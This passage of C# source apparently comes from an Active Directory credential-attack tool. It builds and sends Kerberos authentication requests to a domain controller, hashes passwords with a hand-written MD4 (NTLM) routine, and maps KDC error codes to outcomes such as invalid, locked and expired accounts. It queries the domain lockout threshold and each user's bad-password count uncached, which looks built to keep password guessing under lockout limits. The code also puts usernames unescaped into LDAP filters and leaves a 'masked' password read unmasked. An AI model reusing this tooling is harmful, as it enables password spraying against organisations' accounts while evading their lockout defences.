            for (int i = 0; i < 256; i++) s[i] = (byte)i;
            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + s[i] + key[i % key.Length]) & 255;
                byte temp = s[i]; s[i] = s[j]; s[j] = temp;
            }

            // PRGA
            int x = 0, y = 0;
            for (int i = 0; i < data.Length; i++)
            {
                x = (x + 1) & 255;
                y = (y + s[x]) & 255;
                byte temp = s[x]; s[x] = s[y]; s[y] = temp;
                result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) & 255]);
            }

            return result;
        }

        private static byte[] SendToKdc(string host, int port, byte[] data)
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    client.Connect(host, port);
                    client.SendTimeout = 5000;
                    client.ReceiveTimeout = 5000;

                    using (NetworkStream stream = client.GetStream())
                    {
                        // TCP Kerberos: 4-byte length prefix (big-endian) + data
                        byte[] lengthPrefix = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(data.Length));
                        stream.Write(lengthPrefix, 0, 4);
                        stream.Write(data, 0, data.Length);
                        stream.Flush();

                        // Read response length
                        byte[] respLenBytes = new byte[4];
                        int read = stream.Read(respLenBytes, 0, 4);
                        if (read < 4) return null;

                        int respLen = IPAddress.NetworkToHostOrder(BitConverter.ToInt32(respLenBytes, 0));
                        if (respLen <= 0 || respLen > 65535) return null;

                        // Read response
                        byte[] response = new byte[respLen];
                        int totalRead = 0;
                        while (totalRead < respLen)
                        {
                            read = stream.Read(response, totalRead, respLen - totalRead);
                            if (read <= 0) break;
                            totalRead += read;
                        }

                        return response;
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        private static KerberosAuthResult ParseKdcResponse(byte[] response)
        {
            if (response == null || response.Length < 10)
                return KerberosAuthResult.Error;

            // Check for AS-REP (APPLICATION 11) vs KRB-ERROR (APPLICATION 30)
            if (response[0] == 0x6B) // AS-REP
            {
                return KerberosAuthResult.Success;
            }
            else if (response[0] == 0x7E) // KRB-ERROR
            {
                // Find error-code in KRB-ERROR
                // KRB-ERROR ::= [APPLICATION 30] SEQUENCE {
                //     ...
                //     error-code [6] Int32,
                //     ...
                // }

                // Search for error code tag [6] = 0xA6
                for (int i = 0; i < response.Length - 5; i++)
                {
                    if (response[i] == 0xA6 && response[i + 1] == 0x03 && response[i + 2] == 0x02 && response[i + 3] == 0x01)
                    {
                        int errorCode = response[i + 4];

                        switch (errorCode)
                        {
                            case 6:  // KDC_ERR_C_PRINCIPAL_UNKNOWN
                                return KerberosAuthResult.InvalidCredentials;
                            case 18: // KDC_ERR_CLIENT_REVOKED (disabled)
                                return KerberosAuthResult.AccountDisabled;
                            case 23: // KDC_ERR_KEY_EXPIRED (password expired)
                                return KerberosAuthResult.PasswordExpired;
                            case 24: // KDC_ERR_PREAUTH_FAILED
                                return KerberosAuthResult.InvalidCredentials;
                            case 25: // KDC_ERR_PREAUTH_REQUIRED
                                return KerberosAuthResult.PreAuthRequired;
                            case 37: // KDC_ERR_CLIENT_NOT_TRUSTED (locked)
                                return KerberosAuthResult.AccountLocked;
                            default:
                                OutputHelper.Verbose($"[*] KRB error code: {errorCode}");
                                return KerberosAuthResult.Error;
                        }
                    }
                }

                return KerberosAuthResult.Error;
            }

            return KerberosAuthResult.Error;
        }

        private static int GetLockoutThreshold()
        {
            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(objectClass=domain)";
                searcher.PropertiesToLoad.Add("lockoutThreshold");

                SearchResult result = searcher.FindOne();
                if (result != null && result.Properties.Contains("lockoutThreshold"))
                {
                    return Convert.ToInt32(result.Properties["lockoutThreshold"][0]);
                }
            }
            catch { }

            return 0;
        }

        private static string GetKdcHost()
        {
            try
            {
                // Get domain controller
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))";
                searcher.PropertiesToLoad.Add("dNSHostName");

                SearchResult result = searcher.FindOne();
                if (result != null && result.Properties.Contains("dNSHostName"))
                {
                    return result.Properties["dNSHostName"][0].ToString();
                }

                // Fallback: use domain name
                return AuthContext.DomainName;
            }
            catch
            {
                return AuthContext.DomainName;
            }
        }

        
        /// Get badPwdCount for a single user (fresh query, no cache)
        private static int GetUserBadPwdCount(string username)
        {
            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = $"(&(objectClass=user)(samAccountName={username}))";
                searcher.PropertiesToLoad.Add("badPwdCount");
                searcher.CacheResults = false; // IMPORTANT: Don't cache!

                SearchResult result = searcher.FindOne();
                if (result != null && result.Properties.Contains("badPwdCount") && result.Properties["badPwdCount"].Count > 0)
                {
                    return Convert.ToInt32(result.Properties["badPwdCount"][0]);
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] Error getting badPwdCount for {username}: {ex.Message}");
            }

            return 0;
        }

        
        /// Get badPwdCount for all users (batch query for initial check)
        private static Dictionary<string, int> GetAllUsersBadPwdCount()
        {
            var result = new Dictionary<string, int>(StringComparer.OrdinalIgnoreCase);

            try
            {
                DirectoryEntry de = AuthContext.GetDirectoryEntry();
                DirectorySearcher searcher = new DirectorySearcher(de);
                searcher.Filter = "(&(objectClass=user)(objectCategory=person))";
                searcher.PropertiesToLoad.Add("samAccountName");
                searcher.PropertiesToLoad.Add("badPwdCount");
                searcher.PageSize = 1000;
                searcher.CacheResults = false; // IMPORTANT: Don't cache!

                SearchResultCollection results = searcher.FindAll();

                foreach (SearchResult sr in results)
                {
                    if (sr.Properties.Contains("samAccountName") && sr.Properties["samAccountName"].Count > 0)
                    {
                        string username = sr.Properties["samAccountName"][0].ToString();
                        int badPwdCount = 0;

                        if (sr.Properties.Contains("badPwdCount") && sr.Properties["badPwdCount"].Count > 0)
                        {
                            badPwdCount = Convert.ToInt32(sr.Properties["badPwdCount"][0]);
                        }

                        result[username] = badPwdCount;
                    }
                }
            }
            catch (Exception ex)
            {
                OutputHelper.Verbose($"[!] Error getting badPwdCount for users: {ex.Message}");
            }

            return result;
        }

        // ASN.1 helper methods
        private static byte[] BuildContextTag(int tag, byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add((byte)(0xA0 + tag)); // Context tag
            result.AddRange(BuildLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildSequence(byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add(0x30); // SEQUENCE
            result.AddRange(BuildLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildInteger(int value)
        {
            List<byte> result = new List<byte>();
            result.Add(0x02); // INTEGER

            if (value == 0)
            {
                result.Add(0x01);
                result.Add(0x00);
            }
            else if (value > 0 && value <= 127)
            {
                result.Add(0x01);
                result.Add((byte)value);
            }
            else
            {
                byte[] bytes = BitConverter.GetBytes(value);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(bytes);

                // Remove leading zeros but keep sign bit
                int start = 0;
                while (start < bytes.Length - 1 && bytes[start] == 0 && (bytes[start + 1] & 0x80) == 0)
                    start++;

                int len = bytes.Length - start;
                result.Add((byte)len);
                for (int i = start; i < bytes.Length; i++)
                    result.Add(bytes[i]);
            }

            return result.ToArray();
        }

        private static byte[] BuildOctetString(byte[] content)
        {
            List<byte> result = new List<byte>();
            result.Add(0x04); // OCTET STRING
            result.AddRange(BuildLength(content.Length));
            result.AddRange(content);
            return result.ToArray();
        }

        private static byte[] BuildGeneralString(string value)
        {
            List<byte> result = new List<byte>();
            result.Add(0x1B); // GeneralString
            byte[] bytes = Encoding.ASCII.GetBytes(value);
            result.AddRange(BuildLength(bytes.Length));
            result.AddRange(bytes);
            return result.ToArray();
        }

        private static byte[] BuildLength(int length)
        {
            if (length < 128)
            {
                return new byte[] { (byte)length };
            }
            else if (length < 256)
            {
                return new byte[] { 0x81, (byte)length };
            }
            else
            {
                return new byte[] { 0x82, (byte)(length >> 8), (byte)(length & 0xFF) };
            }
        }

        private static string ReadPasswordMasked()
        {
            // Show input so user can verify what they're typing
            return Console.ReadLine()?.Trim() ?? "";
        }

        
        /// Simple MD4 implementation for NTLM hash
        private class MD4
        {
            public byte[] ComputeHash(byte[] input)
            {
                // Use reflection to get MD4 from System.Security.Cryptography
                // or fall back to manual implementation
                try
                {
                    var md4Type = Type.GetType("System.Security.Cryptography.MD4CryptoServiceProvider, System.Security.Cryptography");
                    if (md4Type != null)
                    {
                        dynamic md4 = Activator.CreateInstance(md4Type);
                        return md4.ComputeHash(input);
                    }
                }
                catch { }

                // Manual MD4 implementation
                return ComputeMD4(input);
            }

            private byte[] ComputeMD4(byte[] input)
            {
                // Padding
                int origLength = input.Length;
                int padLength = (56 - (origLength + 1) % 64 + 64) % 64 + 1;
                byte[] padded = new byte[origLength + padLength + 8];
                Array.Copy(input, padded, origLength);
                padded[origLength] = 0x80;

                // Length in bits (little-endian)
                long bitLength = (long)origLength * 8;
                for (int i = 0; i < 8; i++)
                    padded[origLength + padLength + i] = (byte)(bitLength >> (i * 8));

                // Initialize
                uint a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;

                // Process blocks
                for (int i = 0; i < padded.Length; i += 64)
                {
                    uint[] x = new uint[16];
                    for (int j = 0; j < 16; j++)
                        x[j] = BitConverter.ToUInt32(padded, i + j * 4);

                    uint aa = a, bb = b, cc = c, dd = d;

                    // Round 1
                    a = R1(a, b, c, d, x[0], 3); d = R1(d, a, b, c, x[1], 7);
                    c = R1(c, d, a, b, x[2], 11); b = R1(b, c, d, a, x[3], 19);
                    a = R1(a, b, c, d, x[4], 3); d = R1(d, a, b, c, x[5], 7);
                    c = R1(c, d, a, b, x[6], 11); b = R1(b, c, d, a, x[7], 19);
                    a = R1(a, b, c, d, x[8], 3); d = R1(d, a, b, c, x[9], 7);
                    c = R1(c, d, a, b, x[10], 11); b = R1(b, c, d, a, x[11], 19);
                    a = R1(a, b, c, d, x[12], 3); d = R1(d, a, b, c, x[13], 7);
                    c = R1(c, d, a, b, x[14], 11); b = R1(b, c, d, a, x[15], 19);

                    // Round 2
                    a = R2(a, b, c, d, x[0], 3); d = R2(d, a, b, c, x[4], 5);
                    c = R2(c, d, a, b, x[8], 9); b = R2(b, c, d, a, x[12], 13);
                    a = R2(a, b, c, d, x[1], 3); d = R2(d, a, b, c, x[5], 5);
                    c = R2(c, d, a, b, x[9], 9); b = R2(b, c, d, a, x[13], 13);
                    a = R2(a, b, c, d, x[2], 3); d = R2(d, a, b, c, x[6], 5);
                    c = R2(c, d, a, b, x[10], 9); b = R2(b, c, d, a, x[14], 13);
                    a = R2(a, b, c, d, x[3], 3); d = R2(d, a, b, c, x[7], 5);
                    c = R2(c, d, a, b, x[11], 9); b = R2(b, c, d, a, x[15], 13);

                    // Round 3
                    a = R3(a, b, c, d, x[0], 3); d = R3(d, a, b, c, x[8], 9);
                    c = R3(c, d, a, b, x[4], 11); b = R3(b, c, d, a, x[12], 15);
                    a = R3(a, b, c, d, x[2], 3); d = R3(d, a, b, c, x[10], 9);
                    c = R3(c, d, a, b, x[6], 11); b = R3(b, c, d, a, x[14], 15);
                    a = R3(a, b, c, d, x[1], 3); d = R3(d, a, b, c, x[9], 9);
                    c = R3(c, d, a, b, x[5], 11); b = R3(b, c, d, a, x[13], 15);
                    a = R3(a, b, c, d, x[3], 3); d = R3(d, a, b, c, x[11], 9);
                    c = R3(c, d, a, b, x[7], 11); b = R3(b, c, d, a, x[15], 15);

                    a += aa; b += bb; c += cc; d += dd;
                }

                byte[] result = new byte[16];
                Array.Copy(BitConverter.GetBytes(a), 0, result, 0, 4);
                Array.Copy(BitConverter.GetBytes(b), 0, result, 4, 4);
                Array.Copy(BitConverter.GetBytes(c), 0, result, 8, 4);
                Array.Copy(BitConverter.GetBytes(d), 0, result, 12, 4);
                return result;
            }

            private uint R1(uint a, uint b, uint c, uint d, uint x, int s)
            {
                return RotateLeft(a + ((b & c) | (~b & d)) + x, s);
            }

            private uint R2(uint a, uint b, uint c, uint d, uint x, int s)
            {
                return RotateLeft(a + ((b & c) | (b & d) | (c & d)) + x + 0x5A827999, s);
            }

            private uint R3(uint a, uint b, uint c, uint d, uint x, int s)
            {
                return RotateLeft(a + (b ^ c ^ d) + x + 0x6ED9EBA1, s);
            }

            private uint RotateLeft(uint x, int n)
            {
                return (x << n) | (x >> (32 - n));
            }
        }
    }
}
